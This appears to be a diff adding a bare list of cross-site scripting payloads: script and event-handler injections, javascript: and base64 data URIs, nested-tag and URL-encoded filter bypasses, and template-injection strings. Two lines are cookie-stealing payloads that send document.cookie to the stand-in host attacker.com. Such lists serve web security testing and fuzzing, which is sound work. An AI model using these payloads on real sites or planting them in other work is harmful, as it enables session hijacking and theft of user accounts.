@@ -1,0 +1,54 @@
+“-prompt(1)-”
+‘-prompt(1)-’
+<svg onload=alert(1)>
+“;a=prompt,a(1)//
+‘;a=prompt,a(1)//
+‘-eval(“window[‘pro’%2B’mpt’](1)”)-’
+“-eval(“window[‘pro’%2B’mpt’](1)”)-”
+<script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+"><img src=x onerror=alert(1)>
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+&lt;img src=x onerror=alert(1)&gt;
+<script>alert(1)\x00</script>
+"><svg/onload=alert(1)>
+<img src=x onerror=alert('XSS')>
+{"username":"<script>alert(1)</script>"}
+#<img src=x onerror=alert(1)>
+<script>new Image().src="http://attacker.com?cookie="+document.cookie;</script>
+<![CDATA[<script>alert(1)</script>]]>
+"><img/src/onerror=alert(1)>
+";alert(1);//
+{{constructor.constructor('alert(1)')()}}
+<scr<script></script>ipt>alert(1)</scr<script></script>ipt>
+"><svg><foreignObject><xhtml:script>alert(1)</xhtml:script></foreignObject></svg>
+<iframe src="javascript:alert(1)"></iframe>
+"><style>@import url("javascript:alert(1)")</style>
+callback=<script>alert(1)</script>
+<a href="javascript:alert(1)">Click me</a>
+{{7*7}}
+{"name":"<script>alert(1)</script>"}
+<?xml version="1.0" standalone="no"?><svg onload="alert(1)">
+</script><script>alert(1)</script>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+Referer: <script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<body onload="alert(1)">
+xmlhttp.open("GET", "http://attacker.com?cookie=" + document.cookie, true);
+#"><script>alert(1)</script>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<style>*[x=expression(alert(1))]</style>
+"><input type="button" value="Click" onclick="alert(1)">
+<form id="x" onsubmit="alert(1)">
+<video><source onerror="alert(1)"></video>
+document.write('<img src="x" onerror="alert(1)">');
+Set-Cookie: XSS=<script>alert(1)</script>;
+<a href="javascript:alert(1)">Click me</a>
+<base href="javascript:alert(1)//">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
+callback=<script>alert(1)</script>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><script xlink:href="data:text/javascript,alert(1)" /></svg>
+<details ontoggle="alert(1)"><summary>Click</summary></details>
+<object data="javascript:alert(1)"></object>
